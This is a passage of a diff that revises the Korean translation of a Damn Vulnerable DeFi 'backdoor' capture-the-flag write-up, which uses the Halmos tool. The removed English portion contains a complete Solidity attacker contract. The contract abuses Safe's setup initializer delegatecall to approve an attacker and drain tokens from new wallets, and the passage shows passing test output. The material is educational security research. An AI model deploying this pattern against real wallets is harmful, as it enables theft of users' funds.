-This counterexample contains a lot of noise, but you can extract the essence of the bug from it. Anyone can create a **Safe** wallet for **Alice**. But at the same time, during creation, an attacker can call absolutely any code on behalf of **Alice's** **SafeProxy**, using `setup()` and passing the appropriate code as an `initializer`. So Halmos forced **SafeProxy** to execute `approve` for some `symbolic_spender`, thereby breaking the invariant for the absence of `allowance`. 
-This, in fact, is enough for the attack scenario to become obvious: when creating **Safe** wallets for **Alice**, **Bob**, **Charlie** and **David**, we make an `approve` for a contract that we control and withdraw funds from the newly created wallet.
-
-Note that using the **Safe** contract as a proxy for this attack is optional. It's just that Halmos found such a way.
-## Creating an attack
-Attacker:
-```solidity
-// SPDX-License-Identifier: MIT
-
-pragma solidity =0.8.25;
-
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
-import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
-import "../../src/backdoor/WalletRegistry.sol";
-import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-
-contract Attacker {
-    DamnValuableToken token;
-    SafeProxyFactory factory;
-    WalletRegistry registry;
-    address singleton;
-    address recovery;
-
-    constructor(DamnValuableToken _token, 
-                SafeProxyFactory _factory, 
-                WalletRegistry _registry, 
-                address _singleton, 
-                address _recovery) {
-        token = _token;
-        factory = _factory;
-        registry = _registry;
-        singleton = _singleton;
-        recovery = _recovery;
-    }
-
-    function handle_delegatecall(DamnValuableToken _token, address attacker) public {
-        _token.approve(attacker, 10e18);
-    }
-
-    function attack(address[] calldata users) public {
-        for (uint i = 0; i < 4; i++){
-            address[] memory owners = new address[](1);
-            owners[0] = users[i];
-            bytes memory attacking_data = abi.encodeCall(
-                this.handle_delegatecall, (token, address(this)));
-
-            bytes memory initializer = abi.encodeCall(
-                Safe.setup,
-                (
-                    owners,
-                    1,
-                    address(this),
-                    attacking_data,
-                    address(0),
-                    address(0),
-                    0,
-                    payable(address(0))
-                )
-            );
-
-            SafeProxy wallet = factory.createProxyWithCallback(singleton, initializer, 1, IProxyCreationCallback(registry));
-
-            token.transferFrom(address(wallet), recovery, 10e18);
-        }
-    }
-}
-```
-`test_backdoor`:
-```solidity
-function test_backdoor() public checkSolvedByPlayer {
-    Attacker attacker = new Attacker(token, walletFactory, walletRegistry, address(singletonCopy), recovery);
-    attacker.attack(users);
-}
-```
-Run:
-```javascript
-$ forge test --mp test/backdoor/Backdoor.t.sol
-...
-Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
-[PASS] test_assertInitialState() (gas: 62853)
-[PASS] test_backdoor() (gas: 2167005)
-Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.43ms (1.69ms CPU time)      
-```
-Success!
-## Fuzzing?
-According to tradition, this should be some effort "to fit a square peg into a round hole" and somehow make fuzzing engine work in the current problem. But, in fact, we are unlikely to find any "academic novelty" in this. We have already seen how Echidna behaves in tasks with a high level of abstraction and how unnatural, inconvenient and even "fraudulent" it seems to prepare for such a solution to the problem using the example of [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#fuzzing-vs-selfie). Therefore, in this article I will not torture myself or the reader, and we will abandon the search for a solution through fuzzing. But I'd be happy to look at someone's elegant solution via fuzzing, if it exists. I will be glad to be wrong in my conclusions :D.
-
-## Conclusions
-1. Halmos has proven itself to be a powerful tool even in the case of such contracts overloaded with abstractions. The main thing is to meticulously deal with code coverage and skillfully use optimizations with heuristics.
-2. It is very convenient and probably most correct to handle symbolic `delegatecalls` through such special `handle_delegatecall` approach as shown in the article.
-3. On the example of `owners` list and **SafeProxy's** `fallback`, sometimes it is necessary to change the very logic of implementation of some features of target contracts so that Halmos can cope with them.
-4. Once again, we make sure that checking your custom invariants based on the business logic of target contracts is a good idea. Thanks to the addition of such an invariant (`allowance` invariant), we completed the task in one symbolic transaction.
-5. Halmos can sometimes behave non-deterministically under high load. Using non-optimistic options can help make Halmos work more deterministic.
-## Next challenge
-Next writeup in this series is [climber](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/climber)
-```solidity
-              p_to_address_7a0345f_113 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
-              p_to_address_b19e0c9_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
-              p_value_uint256_41861fd_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
-              ...
-```
 이 반례는 많은 노이즈를 포함하고 있지만, 그 안에서 버그의 본질을 추출할 수 있습니다. 누구나 **Alice**를 위한 **Safe** 지갑을 만들 수 있습니다. 하지만 동시에 생성 과정에서, 공격자는 `setup()`을 사용하고 적절한 코드를 `initializer`로 전달함으로써 **Alice**의 **SafeProxy**를 대신하여 절대적으로 어떤 코드든 호출할 수 있습니다. 그래서 Halmos는 **SafeProxy**가 어떤 `symbolic_spender`에 대해 `approve`를 실행하도록 강제했고, 그로 인해 `allowance`가 없다는 불변 조건을 깨뜨렸습니다.
 
-사실 이것만으로도 공격 시나리오가 명백해집니다: **Alice**, **Bob**, **Charlie**, **David**를 위한 **Safe** 지갑을 생성할 때, 우리가 제어하는 계약에 대해 `approve`를 만들고 새로 생성된 지갑에서 자금을 인출합니다.
+사실 이것만으로도 공격 시나리오가 명백해집니다: **Alice**, **Bob**, **Charlie**, **David**를 위한 **Safe** 지갑을 생성할 때, 우리가 제어하는 컨트랙트에 대해 `approve`를 만들고 새로 생성된 지갑에서 자금을 인출합니다.
 
-참고로 이 공격을 위해 **Safe** 계약을 프록시로 사용하는 것은 선택 사항입니다. 단지 Halmos가 그러한 방법을 찾았을 뿐입니다.
+참고로 이 공격을 위해 **Safe** 컨트랙트를 프록시로 사용하는 것은 선택 사항입니다. 단지 Halmos가 그러한 방법을 찾았을 뿐입니다.
 
 ## 공격 생성
 Attacker:
@@ -997,10 +895,10 @@ Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.43ms (1.69ms CPU 
 전통에 따르면, 퍼징 엔진이 현재 문제에서 작동하도록 "네모난 못을 둥근 구멍에 맞추려는" 노력이 있어야 합니다. 하지만 사실, 우리는 이것에서 어떤 "학문적 새로움"도 찾을 것 같지 않습니다. 우리는 이미 높은 수준의 추상화가 있는 작업에서 Echidna가 어떻게 행동하는지, 그리고 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#fuzzing-vs-selfie)의 예에서 문제를 해결하기 위해 준비하는 것이 얼마나 부자연스럽고 불편하며 심지어 "사기"처럼 보이는지 보았습니다. 따라서 이 글에서는 저 자신이나 독자를 고문하지 않을 것이며, 퍼징을 통한 해결책 찾기를 포기할 것입니다. 하지만 퍼징을 통한 우아한 해결책이 존재한다면 기꺼이 살펴보고 싶습니다. 제 결론이 틀렸다면 기쁠 것입니다 :D.
 
 ## 결론
-1. Halmos는 추상화로 과부하된 계약의 경우에도 강력한 도구임이 입증되었습니다. 중요한 것은 코드 커버리지를 꼼꼼하게 처리하고 휴리스틱을 통한 최적화를 능숙하게 사용하는 것입니다.
+1. Halmos는 추상화로 과부하된 컨트랙트의 경우에도 강력한 도구임이 입증되었습니다. 중요한 것은 코드 커버리지를 꼼꼼하게 처리하고 휴리스틱을 통한 최적화를 능숙하게 사용하는 것입니다.
 2. 기사에서 보여준 것처럼 특별한 `handle_delegatecall` 접근 방식을 통해 심볼릭 `delegatecalls`를 처리하는 것이 매우 편리하며 아마도 가장 정확할 것입니다.
-3. `owners` 목록과 **SafeProxy**의 `fallback` 예에서 볼 수 있듯이, 때로는 Halmos가 대처할 수 있도록 타겟 계약의 일부 기능 구현 로직 자체를 변경해야 할 때가 있습니다.
-4. 다시 한번, 타겟 계약의 비즈니스 로직을 기반으로 사용자 정의 불변 조건을 확인하는 것이 좋은 아이디어임을 확인합니다. 그러한 불변 조건(`allowance` 불변 조건)을 추가한 덕분에, 우리는 작업을 하나의 심볼릭 트랜잭션으로 완료했습니다.
+3. `owners` 목록과 **SafeProxy**의 `fallback` 예에서 볼 수 있듯이, 때로는 Halmos가 대처할 수 있도록 타겟 컨트랙트의 일부 기능 구현 로직 자체를 변경해야 할 때가 있습니다.
+4. 다시 한번, 타겟 컨트랙트의 비즈니스 로직을 기반으로 사용자 정의 불변 조건을 확인하는 것이 좋은 아이디어임을 확인합니다. 그러한 불변 조건(`allowance` 불변 조건)을 추가한 덕분에, 우리는 작업을 하나의 심볼릭 트랜잭션으로 완료했습니다.
 5. Halmos는 때때로 높은 부하에서 비결정적으로 동작할 수 있습니다. 비낙관적(non-optimistic) 옵션을 사용하면 Halmos가 더 결정적으로 작동하도록 도울 수 있습니다.
 
 ## 다음 챌린지
